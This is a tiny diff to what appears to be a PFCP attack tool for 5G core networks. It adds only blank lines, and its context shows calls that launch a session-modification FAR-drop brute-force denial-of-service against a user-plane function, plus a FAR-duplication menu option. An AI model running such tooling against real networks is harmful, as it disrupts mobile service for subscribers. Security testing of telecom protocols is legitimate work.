@@ -155,6 +155,8 @@ def main():
         
         dos_obj = PFCPDosAttack(evil_addr, upf_addr, src_port, dest_port, verbose=True)
         dos_obj.Start_pfcp_session_modification_far_drop_bruteforce(far_range=far_range, session_range=session_range)
+        
+        
     if choice == 5:
         print("PFCP Session Modification FAR Duplication selected")
         
